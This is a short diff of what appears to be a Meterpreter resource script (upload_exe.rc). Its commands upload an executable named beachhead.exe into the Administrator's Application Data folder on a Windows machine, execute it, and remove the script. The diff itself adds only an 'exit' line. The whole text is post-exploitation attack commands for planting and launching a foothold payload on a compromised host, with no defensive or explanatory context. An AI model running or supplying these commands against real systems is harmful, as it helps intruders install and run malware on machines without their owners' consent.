@@ -1,3 +1,4 @@
 upload -c beachhead.exe "C:/Documents and Settings/Administrator/Application Data/beachhead.exe"
 execute -f "C:/Documents and Settings/Administrator/Application Data/beachhead.exe"
 rm upload_exe.rc
+exit
